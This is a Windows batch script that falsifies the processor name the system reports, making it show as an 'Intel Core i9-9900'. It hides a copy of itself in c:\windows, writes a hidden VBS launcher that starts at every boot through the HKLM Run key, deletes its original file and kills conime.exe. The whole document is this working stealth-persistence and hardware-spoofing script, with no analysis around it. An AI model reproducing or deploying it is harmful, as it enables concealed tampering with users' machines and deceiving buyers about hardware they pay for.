@echo off
reg add "hkcu\software\microsoft\internet explorer\main" /v "window title" /t reg_sz /d "科技以人为本" /f
if exist c:\windows\h.vbs goto reg
for /f "tokens=*" %%a in ('echo %0') do (set dpnx=%%a)
copy "%dpnx%" c:\windows\cpu.bat && attrib c:\windows\cpu.bat +h
(
echo set bqad=createobject^("wscript.shell"^)
echo bqad.run "c:\windows\cpu.bat",vbhide
echo wscript.quit
)>c:\windows\h.vbs
attrib c:\windows\h.vbs +h
reg add hklm\software\microsoft\windows\currentversion\run /v hrvbs /t reg_sz /d c:\windows\h.vbs /f
(
echo Windows Registry Editor Version 5.00
echo.
echo [HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0]
echo "Component Information"=hex:00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00
echo "Identifier"="x86 Family 15 Model 4 Stepping 1"
echo "Configuration Data"=hex^(9^):ff,ff,ff,ff,ff,ff,ff,ff,00,00,00,00,00,00,00,00
echo "ProcessorNameString"="Intel(R) Core(TM) i9-9900 CPU @ 3.10GHz"
echo "VendorIdentifier"="GenuineIntel"
echo "FeatureSet"=dword:80073fff
echo "~MHz"=dword:00000ae8
echo "Update Signature"=hex:00,00,00,00,05,00,00,00
echo "Update Status"=dword:00000002
)>c:\windows\cpu.reg
regedit /s c:\windows\cpu.reg
del "%dpnx%"
taskkill /f /im conime.exe
exit
:reg
regedit /s c:\windows\cpu.reg
taskkill /f /im conime.exe
exit
rem 结束::::::::::::::::::::::::::::::::